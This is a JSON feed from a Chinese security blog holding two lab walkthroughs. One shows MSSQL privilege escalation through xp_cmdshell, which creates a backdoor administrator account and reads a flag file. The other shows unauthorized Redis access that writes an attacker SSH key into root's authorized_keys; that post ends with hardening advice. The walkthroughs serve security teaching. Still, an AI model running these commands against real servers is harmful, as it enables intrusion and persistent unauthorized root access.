{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"数据库安全\" category",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "MSSQL提权攻击",
            "date_published": "2022-09-27T14:46:06.000Z",
            "content_html": "<h1 id=\"sql-servermssql提权\"><a class=\"markdownIt-Anchor\" href=\"#sql-servermssql提权\">#</a> SQL Server（MSSQL）提权</h1>\n<p>总结一下，下文使用有效命令全部为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\">#master..xp_cmdshell的全写是master.dbo.xp_cmdshell</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;ipconfig&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\桌面\\flag.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-环境准备\"><a class=\"markdownIt-Anchor\" href=\"#0x01-环境准备\">#</a> 0x01 环境准备</h2>\n<p>输入用户名和密码，以 <code>sa</code>  身份登录 SQL Server2005</p>\n<p><img src=\"image-20220927205858375.png\" alt=\"image-20220927205858375\"></p>\n<p>登录后可以看到这样的界面</p>\n<p><img src=\"image-20220927210049933.png\" alt=\"image-20220927210049933\"></p>\n<p>首先我们了解下什么是 sp_configure？</p>\n<p><img src=\"image-20220927210431221.png\" alt=\"image-20220927210431221\"></p>\n<p>其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置 <code>show advanced options</code>  为 <code>1</code> ，可以显示高级选项。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">USE master;  </span><br><span class=\"line\">GO  </span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>;  </span><br></pre></td></tr></table></figure>\n<p>sp_configure 的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回 0，失败返回 1，其中高级选项中包含 cmdshell 等。</p>\n<h2 id=\"0x02-提权攻击步骤\"><a class=\"markdownIt-Anchor\" href=\"#0x02-提权攻击步骤\">#</a> 0x02 提权攻击步骤</h2>\n<h3 id=\"1第一步更改当前服务器的全局配置首选高级选项为1\"><a class=\"markdownIt-Anchor\" href=\"#1第一步更改当前服务器的全局配置首选高级选项为1\">#</a> ①第一步，更改当前服务器的全局配置首选高级选项为 1</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#以下大写字母均可小写</span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211220768.png\" alt=\"image-20220927211220768\"></p>\n<p>使用鼠标选中一行，然后右键选择执行</p>\n<p><img src=\"image-20220927211614093.png\" alt=\"image-20220927211614093\"></p>\n<h3 id=\"2第二步打开cmd-shell\"><a class=\"markdownIt-Anchor\" href=\"#2第二步打开cmd-shell\">#</a> ②第二步，打开 cmd-shell</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211736845.png\" alt=\"image-20220927211736845\"></p>\n<h3 id=\"3第三步输入你想执行的windows-cmd命令\"><a class=\"markdownIt-Anchor\" href=\"#3第三步输入你想执行的windows-cmd命令\">#</a> ③第三步，输入你想执行的 windows cmd 命令。</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211958154.png\" alt=\"image-20220927211958154\"></p>\n<p>言归正传，我们为系统添加属于 <code>攻击者自己的net user账户</code>  (主要目的是使用已知的用户名和密码)</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#比如，账户名是HeyJack 密码也是HeyJack</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212339481.png\" alt=\"image-20220927212339481\"></p>\n<p>此时，我们在 windows 的 cmd 里，执行 net user</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。</span></span><br><span class=\"line\">net user</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212609276.png\" alt=\"image-20220927212609276\"></p>\n<p>&quot;开始&quot; 菜单 — 管理工具 — 计算机管理 — 本地用户和组 — 用户 —HeyJack 右键属性 — 隶属于</p>\n<p>查看当前分组在 Users 组</p>\n<p><img src=\"image-20220927212746484.png\" alt=\"image-20220927212746484\"></p>\n<h3 id=\"4第四步将你新建的用户移到administrators组\"><a class=\"markdownIt-Anchor\" href=\"#4第四步将你新建的用户移到administrators组\">#</a> ④第四步，将你新建的用户移到 administrators 组</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927213122417.png\" alt=\"image-20220927213122417\"></p>\n<p>继续查看我们的分组情况，可以看到，提权成功：</p>\n<p><img src=\"image-20220927213219218.png\" alt=\"image-20220927213219218\"></p>\n<h3 id=\"5第五步获取远程服务器中的目标文件\"><a class=\"markdownIt-Anchor\" href=\"#5第五步获取远程服务器中的目标文件\">#</a> ⑤第五步，获取远程服务器中的目标文件</h3>\n<p>我们假设，服务器中管理员 Administrator 创建了一个 flag.txt 文件放在了桌面，我们的 <code>最终目的</code> 就是<strong>为了获取它</strong>。</p>\n<p><img src=\"image-20220927221944235.png\" alt=\"image-20220927221944235\"></p>\n<h4 id=\"第一种方案3389远程连接\"><a class=\"markdownIt-Anchor\" href=\"#第一种方案3389远程连接\">#</a> 第一种方案，3389 远程连接</h4>\n<p>在 win+R 输入 <code>mstsc</code></p>\n<p><img src=\"image-20220927213803912.png\" alt=\"image-20220927213803912\"></p>\n<p>查看服务器 ip 并在自己的客户端上连接，ip 地址也可以通过 SQL 提权命令 + “ipconfig” 来获取</p>\n<p><img src=\"image-20220927221540178.png\" alt=\"image-20220927221540178\"></p>\n<p>然后 3389 远程连接</p>\n<p><img src=\"image-20220927213905588.png\" alt=\"image-20220927213905588\"></p>\n<p>输入刚刚新建的用户民和密码</p>\n<p><img src=\"image-20220927214036680.png\" alt=\"image-20220927214036680\"></p>\n<p>登录成功</p>\n<p><img src=\"image-20220927214149105.png\" alt=\"image-20220927214149105\"></p>\n<p>然后打开 “我的电脑”— 进入 C 盘 — 找到 “Documents and Settings”— 选择 “Administrators”— 桌面 — 即可看到 flag.txt</p>\n<p><img src=\"image-20220927221815971.png\" alt=\"image-20220927221815971\"></p>\n<h4 id=\"第二种方案使用sql提权命令获取内容\"><a class=\"markdownIt-Anchor\" href=\"#第二种方案使用sql提权命令获取内容\">#</a> 第二种方案，使用 SQL 提权命令获取内容</h4>\n<p>另外，也可以使用 SQL 提权命令去当前管理员用户桌面查找（一般 flag 会放在桌面上）</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#dir命令查看当前路径</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;dir&#x27;</span>;</span><br><span class=\"line\">#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\\Documents <span class=\"keyword\">and</span> Settings\\桌面\\flag.txt</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\Administrator\\桌面\\flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927221113281.png\" alt=\"image-20220927221113281\"></p>\n<p>至此，SQL Server 提权攻击演示完毕。</p>\n",
            "tags": [
                "数据库安全"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "Redis提权攻击",
            "date_published": "2022-09-26T16:02:13.000Z",
            "content_html": "<p><strong>Redis</strong>（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI <a href=\"https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80\">C 语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728\"> 数据库</a>，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由<a href=\"https://baike.baidu.com/item/Pivotal\"> Pivotal</a> 赞助。</p>\n<h2 id=\"0x00-redis提权攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x00-redis提权攻击\">#</a> 0x00 Redis 提权攻击</h2>\n<p>​\t<strong>Redis</strong> 在默认情况下，会绑定在 0.0.0.0:<strong>6379</strong> 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 <code>暴露到公网</code> 上。</p>\n<p>​\t如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>\n<p>​\t攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 <code>/root/.ssh</code>  文件夹的 <code>authotrized_keys</code>  文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\"><strong>类型</strong></th>\n<th style=\"text-align:left\"><strong>IP</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>目标靶机</strong></td>\n<td style=\"text-align:left\">Ubuntu18.04</td>\n<td style=\"text-align:left\">192.168.138.143</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>攻击主机</strong></td>\n<td style=\"text-align:left\">Kali2022</td>\n<td style=\"text-align:left\">192.168.138.145</td>\n</tr>\n</tbody>\n</table>\n<p>如果没有攻击机没有安装 ssh 则：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">安装</span></span><br><span class=\"line\">sudo apt install openssh-server</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">启动ssh服务</span></span><br><span class=\"line\">sudo service ssh start</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-被攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x01-被攻击机部分准备工作\">#</a> 0x01 被攻击机部分准备工作</h2>\n<p>在 Ubuntu 安装 redis 服务器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212305161.png\" alt=\"image-20220926212305161\"></p>\n<p>修改 /etc/redis/redis.conf，总共有三点：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212807655.png\" alt=\"image-20220926212807655\"></p>\n<p>①去除 bind</p>\n<p><img src=\"image-20220926213107025.png\" alt=\"image-20220926213107025\"></p>\n<p>②daemonize yes</p>\n<p><img src=\"image-20220926213521318.png\" alt=\"image-20220926213521318\"></p>\n<p>③protected-mode no</p>\n<p><img src=\"image-20220926232253189.png\" alt=\"image-20220926232253189\"></p>\n<p>重启服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">service redis stop</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">以root身份启动redis服务</span></span><br><span class=\"line\">sudo redis-server /etc/redis/redis.conf</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">尝试在服务器上自己连一下</span></span><br><span class=\"line\">redis-cli</span><br><span class=\"line\">(显示127.0.0.1:6379则OK)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232522408.png\" alt=\"image-20220926232522408\"></p>\n<h2 id=\"0x02-攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x02-攻击机部分准备工作\">#</a> 0x02 攻击机部分准备工作</h2>\n<p>在攻击机上生成 rsa 秘钥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214148985.png\" alt=\"\"></p>\n<p>重定向到 key.txt</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /home/kali/.ssh</span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214549834.png\" alt=\"image-20220926214549834\"></p>\n<p>第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车</p>\n<p><img src=\"image-20220926214811675.png\" alt=\"image-20220926214811675\"></p>\n<p>之后，我们在攻击机（也就是我的 kali）上安装 redis-cli</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class=\"line\">tar -zxf redis-stable.tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入到 redis-stable 目录</span></span><br><span class=\"line\">cd redis-stable</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译</span></span><br><span class=\"line\">make</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">拷贝</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了</span></span><br><span class=\"line\">sudo cp ./src/redis-cli /usr/bin/</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220032721.png\" alt=\"image-20220926220032721\"></p>\n<p>出现如下字样就说明安装成功：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">redis-cli</span><br><span class=\"line\">回车</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220238790.png\" alt=\"image-20220926220238790\"></p>\n<p>将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143</p>\n<p><img src=\"image-20220926220116946.png\" alt=\"image-20220926220116946\"></p>\n<h2 id=\"0x03-开始攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x03-开始攻击\">#</a> 0x03 开始攻击</h2>\n<p>拿到 redis 的 shell 后基本操作：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">info  #查看redis的信息和服务器信息</span><br><span class=\"line\">flushall 删除全部数据</span><br><span class=\"line\">del key  删除键为key的数据</span><br><span class=\"line\">get key  得到参数key的数据</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926234426901.png\" alt=\"image-20220926234426901\"></p>\n<p>在我们的攻击机 (kali) 上运行如下代码：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test</span><br><span class=\"line\">看到回显了OK以后</span><br><span class=\"line\">redis-cli -h 192.168.138.143进入shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926222112479.png\" alt=\"image-20220926222112479\"></p>\n<p>将目录切换到 /root/.ssh</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926231146929.png\" alt=\"image-20220926231146929\"></p>\n<p>设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232746706.png\" alt=\"\"></p>\n<p>最后，回到生成秘钥的终端：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">使用ssh命令 以root用户的身份 连接“被攻击机”的ip</span></span><br><span class=\"line\">ssh root@192.168.138.143</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232832651.png\" alt=\"image-20220926232832651\"></p>\n<p>至此，redis 提权攻击完成。</p>\n<h2 id=\"0x04-修复建议安全加固\"><a class=\"markdownIt-Anchor\" href=\"#0x04-修复建议安全加固\">#</a> 0x04 修复建议 / 安全加固</h2>\n<h3 id=\"1禁止一些高危命令重启redis才能生效\"><a class=\"markdownIt-Anchor\" href=\"#1禁止一些高危命令重启redis才能生效\">#</a> <strong>1. 禁止一些高危命令</strong> (重启 redis 才能生效)</h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>或者另起名字</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;name1&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;name2&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;name3&quot;</span></span><br></pre></td></tr></table></figure>\n<p>来禁用远程修改 DB 文件地址</p>\n<h3 id=\"2以低权限运行-redis-服务\"><a class=\"markdownIt-Anchor\" href=\"#2以低权限运行-redis-服务\">#</a> <strong>2. 以低权限运行 Redis 服务</strong></h3>\n<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>\n<h3 id=\"3为-redis-添加密码验证\"><a class=\"markdownIt-Anchor\" href=\"#3为-redis-添加密码验证\">#</a> <strong>3. 为 Redis 添加密码验证</strong></h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">requirepass</span> <span class=\"string\">mypassword</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"4禁止外网访问-redis\"><a class=\"markdownIt-Anchor\" href=\"#4禁止外网访问-redis\">#</a> <strong>4. 禁止外网访问 Redis</strong></h3>\n<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">bind</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"string\">::1</span></span><br></pre></td></tr></table></figure>\n<p>redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。</p>\n<h3 id=\"5保证-authorized_keys-文件的安全\"><a class=\"markdownIt-Anchor\" href=\"#5保证-authorized_keys-文件的安全\">#</a> <strong>5. 保证 authorized_keys 文件的安全</strong></h3>\n<p>为了保证安全，您应该阻止其他用户添加新的公钥。</p>\n<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh</span><br></pre></td></tr></table></figure>\n<p><strong>注意:</strong> 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>\n<h3 id=\"6修改默认端口\"><a class=\"markdownIt-Anchor\" href=\"#6修改默认端口\">#</a> <strong>6. 修改默认端口</strong></h3>\n<p>修改 redis.conf 文件， 找到并修改原来的 <code>port 6379</code>  ，比如改成 <code>port 17033</code> ，让人摸不着头脑。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">port 17033 </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "数据库安全"
            ]
        }
    ]
}